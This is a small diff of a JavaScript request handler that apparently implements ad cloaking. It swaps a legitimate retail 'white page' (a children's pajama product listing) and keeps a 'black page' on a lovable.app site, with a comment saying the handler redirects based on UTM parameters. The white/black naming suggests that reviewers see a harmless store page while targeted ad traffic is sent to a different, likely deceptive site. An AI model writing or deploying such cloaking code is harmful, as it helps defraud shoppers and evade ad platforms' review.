@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.next.de/en/style/su619879/f29069";
-    const blackPageURL = "https://luvcshap.lovable.app/?";
+    const whitePageURL = "https://www.carters.com/p/plaid-print-reindeer-christmas-loose-fit-long-sleeve-sleep-and-play-pajamas-red/V_1T751810";
+    const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
